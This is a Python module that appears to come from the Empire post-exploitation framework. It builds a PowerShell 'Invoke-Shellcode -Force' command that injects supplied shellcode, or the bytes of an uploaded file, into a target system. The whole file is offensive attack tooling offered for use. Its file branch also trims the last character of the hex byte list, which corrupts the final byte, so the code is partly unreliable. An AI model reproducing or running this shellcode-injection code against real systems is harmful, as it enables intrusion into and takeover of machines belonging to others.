import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.core.module_service import auto_finalize, auto_get_source


class Module:
    @staticmethod
    @auto_get_source
    @auto_finalize
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
        script: str = "",
    ):

        script_end = "\nInvoke-Shellcode -Force"

        for option, values in params.items():
            if (
                option.lower() != "agent"
                and option.lower() != "listener"
                and values
                and values != ""
            ):
                if option.lower() == "shellcode":
                    # transform the shellcode to the correct format
                    sc = ",0".join(values.split("\\"))[0:]
                    script_end += " -" + str(option) + " @(" + sc + ")"
                elif option.lower() == "file":
                    data = base64.b64decode(params["File"].get_base64_file())
                    sc = ",".join([f"0x{byte:02x}" for byte in data])
                    script_end += f" -shellcode @({sc[:-1]})"
                else:
                    script_end += " -" + str(option) + " " + str(values)

        script_end += "; 'Shellcode injected.'"

        return script, script_end
